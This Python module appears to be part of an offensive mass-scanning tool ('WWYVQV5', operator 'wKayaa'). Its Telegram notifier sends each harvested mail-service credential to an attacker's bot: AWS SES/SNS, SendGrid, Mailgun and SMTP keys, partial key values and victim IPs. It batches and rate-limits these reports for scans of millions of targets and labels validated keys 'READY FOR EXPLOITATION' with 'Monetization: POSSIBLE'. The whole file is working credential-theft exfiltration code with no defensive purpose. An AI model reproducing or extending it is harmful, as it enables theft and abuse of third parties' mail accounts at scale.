#!/usr/bin/env python3
"""
WWYVQV5 - Enhanced Telegram pour Mail Services with Large Scale Optimizations
"""

import asyncio
import aiohttp
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from collections import deque
from dataclasses import dataclass, field


@dataclass
class TelegramRateLimitConfig:
    """Configuration for Telegram rate limiting"""
    max_messages_per_minute: int = 20
    max_messages_per_hour: int = 200
    batch_size: int = 100
    batch_interval: int = 300  # seconds
    progress_interval: int = 10000  # targets
    enable_batching: bool = True
    only_validated_credentials: bool = True


class TelegramRateLimiter:
    """Rate limiter specifically for Telegram Bot API"""
    
    def __init__(self, config: TelegramRateLimitConfig):
        self.config = config
        self.minute_messages = deque(maxlen=config.max_messages_per_minute)
        self.hour_messages = deque(maxlen=config.max_messages_per_hour)
        self.last_message_time = 0
        
    async def can_send_message(self) -> bool:
        """Check if we can send a message without hitting rate limits"""
        current_time = time.time()
        
        # Remove old messages from tracking
        minute_cutoff = current_time - 60
        hour_cutoff = current_time - 3600
        
        # Clean minute window
        while self.minute_messages and self.minute_messages[0] < minute_cutoff:
            self.minute_messages.popleft()
            
        # Clean hour window
        while self.hour_messages and self.hour_messages[0] < hour_cutoff:
            self.hour_messages.popleft()
        
        # Check limits
        if len(self.minute_messages) >= self.config.max_messages_per_minute:
            return False
        if len(self.hour_messages) >= self.config.max_messages_per_hour:
            return False
        
        # Minimum 1 second between messages
        if current_time - self.last_message_time < 1.0:
            return False
            
        return True
    
    async def wait_for_send_permission(self):
        """Wait until we can send a message"""
        while not await self.can_send_message():
            await asyncio.sleep(1.0)
    
    def record_message_sent(self):
        """Record that a message was sent"""
        current_time = time.time()
        self.minute_messages.append(current_time)
        self.hour_messages.append(current_time)
        self.last_message_time = current_time


class TelegramMailNotifier:
    """Enhanced Telegram notifier with rate limiting and batch processing"""
    
    def __init__(self, token: str = None, chat_id: str = None, config: Optional[TelegramRateLimitConfig] = None):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.hit_counter = 0
        
        # Rate limiting and batching
        self.config = config or TelegramRateLimitConfig()
        self.rate_limiter = TelegramRateLimiter(self.config)
        self.pending_credentials = []
        self.last_batch_time = time.time()
        self.last_progress_count = 0
        
    async def send_mail_credential_alert(self, credential: Dict, cluster_info: Dict = None):
        """Enhanced credential alert with batching support"""
        if not self.enabled:
            return
            
        # Filter credentials if configured
        if self.config.only_validated_credentials and not credential.get('validated', False):
            return
            
        self.hit_counter += 1
        
        # Add to batch if batching is enabled
        if self.config.enable_batching:
            self.pending_credentials.append({
                'credential': credential,
                'cluster_info': cluster_info,
                'timestamp': datetime.utcnow()
            })
            
            # Send batch if threshold reached or time limit exceeded
            current_time = time.time()
            if (len(self.pending_credentials) >= self.config.batch_size or 
                current_time - self.last_batch_time >= self.config.batch_interval):
                await self._send_batch_notification()
        else:
            # Send individual alert
            await self._send_individual_alert(credential, cluster_info)
    
    async def _send_individual_alert(self, credential: Dict, cluster_info: Dict = None):
        """Send individual credential alert"""
        service_emojis = {
            'AWS_SES_SNS': '🟠 AWS SES/SNS',
            'SENDGRID': '🟢 SendGrid',
            'MAILGUN': '🔴 Mailgun',
            'SPARKPOST': '🟡 SparkPost',
            'POSTMARK': '🟣 Postmark',
            'MANDRILL': '🔵 Mandrill',
            'GENERIC_SMTP': '⚪ SMTP Générique'
        }
        
        service_icon = service_emojis.get(credential['service'], '⚫ Unknown')
        
        if credential.get('validated', False):
            status = "✅ VALIDÉ & OPÉRATIONNEL"
            threat_level = "🔥 CRITIQUE"
        else:
            status = "🔍 Détecté (Non validé)"
            threat_level = "⚠️ Moyen"
            
        message = f"""🚨 MAIL CREDENTIAL HIT #{self.hit_counter} 🚨

{service_icon}
🔑 Type: {credential['type'].upper()}
💎 Value: {credential['value'][:20]}...
{status}
{threat_level}

📍 Target: {cluster_info.get('ip', 'Unknown') if cluster_info else 'Unknown'}
⏰ Time: {datetime.utcnow().strftime('%H:%M:%S')}

wKayaa Production 🚀"""
        
        await self._send_telegram_message(message)
    
    async def _send_batch_notification(self):
        """Send batched credential notifications"""
        if not self.pending_credentials:
            return
            
        # Group credentials by service
        services_count = {}
        validated_count = 0
        total_count = len(self.pending_credentials)
        
        for item in self.pending_credentials:
            cred = item['credential']
            service = cred['service']
            services_count[service] = services_count.get(service, 0) + 1
            if cred.get('validated', False):
                validated_count += 1
        
        # Create batch summary message
        message = f"""📊 BATCH CREDENTIAL SUMMARY

🎯 Total found: {total_count}
✅ Validated: {validated_count}
❌ Pending validation: {total_count - validated_count}

📋 BY SERVICE:
"""
        
        service_emojis = {
            'AWS_SES_SNS': '🟠',
            'SENDGRID': '🟢', 
            'MAILGUN': '🔴',
            'SPARKPOST': '🟡',
            'POSTMARK': '🟣',
            'MANDRILL': '🔵',
            'GENERIC_SMTP': '⚪'
        }
        
        for service, count in services_count.items():
            emoji = service_emojis.get(service, '⚫')
            message += f"├── {emoji} {service}: {count}\n"
        
        message += f"""
🚀 READY FOR EXPLOITATION:
├── Validated services: {validated_count}
├── Send capacity: UNLIMITED
└── Monetization: POSSIBLE

Batch #{len(self.pending_credentials) // self.config.batch_size + 1}
Session: {datetime.utcnow().strftime('%Y%m%d_%H%M%S')}
Operator: wKayaa | WWYVQV5 Mail Hunter"""
        
        await self._send_telegram_message(message)
        
        # Clear pending credentials
        self.pending_credentials.clear()
        self.last_batch_time = time.time()
    
    async def send_progress_update(self, processed_count: int, total_count: int, performance_stats: Dict = None):
        """Send progress update for large-scale operations"""
        if not self.enabled:
            return
            
        # Only send progress updates at configured intervals
        if processed_count - self.last_progress_count < self.config.progress_interval:
            return
            
        self.last_progress_count = processed_count
        
        progress_pct = (processed_count / total_count * 100) if total_count > 0 else 0
        
        message = f"""📊 LARGE SCALE SCAN PROGRESS

🎯 Targets: {processed_count:,}/{total_count:,} ({progress_pct:.1f}%)
⚡ Speed: {performance_stats.get('processing_rate', 0):.1f} targets/sec
💾 Memory: {performance_stats.get('memory_usage_mb', 0):.0f} MB
⏱️ Runtime: {performance_stats.get('elapsed_seconds', 0):.0f}s

📈 STATISTICS:
├── Services found: {performance_stats.get('found_services', 0)}
├── Credentials found: {performance_stats.get('found_credentials', 0)}
└── Validated credentials: {performance_stats.get('validated_credentials', 0)}

🔥 wKayaa Ultimate Scanner"""
        
        await self._send_telegram_message(message)
    
    async def send_large_scale_start(self, total_targets: int, config_info: Dict = None):
        """Send notification when large-scale scan starts"""
        if not self.enabled:
            return
            
        message = f"""🚀 LARGE SCALE SCAN INITIATED

📊 CONFIGURATION:
├── Total targets: {total_targets:,}
├── Concurrent threads: {config_info.get('max_concurrent', 'Unknown')}
├── Batch size: {config_info.get('batch_size', 'Unknown')}
├── Mode: {config_info.get('mode', 'Unknown').upper()}

⚡ OPTIMIZATION ACTIVE:
├── Memory monitoring: ✅
├── Adaptive rate limiting: ✅
├── Checkpoint recovery: ✅
├── Batch notifications: ✅

🎯 TARGET: 16M+ Support Ready
Operator: wKayaa | WWYVQV5 Ultimate"""
        
        await self._send_telegram_message(message)
    
    async def send_large_scale_complete(self, stats: Dict):
        """Send completion notification for large-scale scan"""
        if not self.enabled:
            return
            
        # Send any remaining batched credentials first
        if self.pending_credentials:
            await self._send_batch_notification()
        
        duration = stats.get('elapsed_seconds', 0)
        total_processed = stats.get('total_processed', 0)
        avg_rate = total_processed / duration if duration > 0 else 0
        
        message = f"""🎉 LARGE SCALE SCAN COMPLETED

📊 FINAL STATISTICS:
├── Total processed: {total_processed:,}
├── Duration: {duration:.0f}s ({duration/60:.1f}min)
├── Average rate: {avg_rate:.1f} targets/sec
├── Peak memory: {stats.get('peak_memory_mb', 0):.0f}MB

🎯 RESULTS:
├── Services found: {stats.get('found_services', 0)}
├── Credentials found: {stats.get('found_credentials', 0)}
├── Validated credentials: {stats.get('validated_credentials', 0)}
├── Success rate: {stats.get('success_rate', 0):.1f}%

🚀 MISSION ACCOMPLISHED
wKayaa Production | WWYVQV5 Ultimate"""
        
        await self._send_telegram_message(message)
    
    async def _send_telegram_message(self, message: str):
        """Send message with rate limiting"""
        if not self.enabled:
            return
            
        try:
            # Wait for rate limit permission
            await self.rate_limiter.wait_for_send_permission()
            
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data) as response:
                    if response.status == 200:
                        self.rate_limiter.record_message_sent()
                    else:
                        error_text = await response.text()
                        print(f"❌ Telegram error {response.status}: {error_text}")
                        
        except Exception as e:
            print(f"❌ Failed to send Telegram message: {e}")
    
    async def send_bulk_credentials_summary(self, credentials: List[Dict]):
        """Enhanced bulk summary with rate limiting"""
        if not credentials or not self.enabled:
            return
            
        # Force send as batch regardless of batching config
        self.pending_credentials = [
            {'credential': cred, 'cluster_info': None, 'timestamp': datetime.utcnow()}
            for cred in credentials
        ]
        await self._send_batch_notification()
    
    async def send_mail_test_result(self, test_result: Dict):
        """Send mail test result with rate limiting"""
        if not self.enabled:
            return
            
        status_icon = "✅" if test_result.get('success', False) else "❌"
        
        message = f"""📧 MAIL TEST RESULT

{status_icon} Service: {test_result.get('service', 'Unknown')}
🔑 Credential: {test_result.get('credential_id', 'Unknown')}
📊 Result: {test_result.get('status', 'Unknown')}
📨 Test emails sent: {test_result.get('emails_sent', 0)}

💡 Details: {test_result.get('details', 'No details')}

⏰ {datetime.utcnow().strftime('%H:%M:%S')}
wKayaa Mail Validator"""
        
        await self._send_telegram_message(message)
    
    def get_rate_limit_stats(self) -> Dict:
        """Get rate limiting statistics"""
        return {
            "pending_batch_size": len(self.pending_credentials),
            "hit_counter": self.hit_counter,
            "rate_limiter_stats": self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            "last_batch_time": self.last_batch_time,
            "config": {
                "batch_size": self.config.batch_size,
                "batch_interval": self.config.batch_interval,
                "max_messages_per_minute": self.config.max_messages_per_minute,
                "max_messages_per_hour": self.config.max_messages_per_hour
            }
        }
